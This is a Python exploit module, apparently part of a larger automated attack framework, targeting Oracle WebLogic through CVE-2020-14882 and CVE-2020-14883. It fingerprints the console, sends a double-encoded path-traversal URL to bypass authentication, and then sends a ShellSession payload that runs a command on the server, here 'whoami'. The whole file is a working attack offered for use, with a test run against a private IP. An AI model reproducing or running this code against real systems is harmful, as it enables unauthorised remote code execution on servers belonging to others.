"""
Oracle WebLogic Deserialization Exploit
CVE-2020-14882, CVE-2020-14883
"""

import socket
import requests
from typing import Dict, Tuple
import sys
import os
import base64

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class WebLogic_Exploit(BaseExploit):
    """
    Oracle WebLogic Deserialization Exploit
    Targets: WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3-4, 14.1.1.0
    
    Attack Vectors:
    - CVE-2020-14882: Console path traversal
    - CVE-2020-14883: Console RCE
    - Deserialization attacks
    """
    
    def __init__(self):
        super().__init__(
            name="WebLogic_Deserialization",
            target_ports=[7001, 7002, 8001, 8002],
            target_os=["Windows", "Linux", "Unix"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is running vulnerable WebLogic"""
        ip = target['ip']
        
        for port in [7001, 7002, 8001, 8002]:
            if port in target.get('open_ports', []):
                try:
                    protocol = "https" if port in [7002, 8002] else "http"
                    url = f"{protocol}://{ip}:{port}/console/login/LoginForm.jsp"
                    
                    response = requests.get(url, timeout=5, verify=False)
                    
                    # Check for WebLogic
                    if 'weblogic' in response.text.lower() or 'oracle' in response.text.lower():
                        logger.debug(f"WebLogic detected on {ip}:{port}")
                        return True
                        
                except Exception as e:
                    logger.debug(f"WebLogic check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt WebLogic exploitation"""
        ip = target['ip']
        
        logger.info(f"Attempting WebLogic exploit on {ip}")
        
        # Find which port has WebLogic
        port = 7001
        for p in [7001, 7002, 8001, 8002]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        protocol = "https" if port in [7002, 8002] else "http"
        
        try:
            # CVE-2020-14882: Console path traversal
            # Bypass authentication
            
            # Path traversal payload
            bypass_url = (
                f"{protocol}://{ip}:{port}/console/css/"
                "%252e%252e%252fconsole.portal"
            )
            
            response = requests.get(bypass_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                # CVE-2020-14883: RCE via handle parameter
                
                # Command to execute
                cmd = "whoami"
                
                # RCE payload
                rce_url = (
                    f"{protocol}://{ip}:{port}/console/css/"
                    "%252e%252e%252fconsole.portal"
                    f"?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession"
                    f"('java.lang.Runtime.getRuntime().exec(\"{cmd}\");')"
                )
                
                rce_response = requests.get(rce_url, timeout=10, verify=False)
                
                if rce_response.status_code in [200, 500]:
                    self.stats['success'] += 1
                    logger.success(f"WebLogic RCE successful on {ip}")
                    
                    return True, {
                        'method': 'WebLogic_CVE-2020-14882_14883',
                        'port': port,
                        'service': 'Oracle WebLogic',
                        'rce': True
                    }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"WebLogic exploit error on {ip}: {e}")
            return False, {}


if __name__ == "__main__":
    # Test the exploit
    weblogic = WebLogic_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [7001],
        'os_guess': 'Linux'
    }
    
    print(f"Testing WebLogic exploit on {test_target['ip']}")
    
    if weblogic.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = weblogic.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
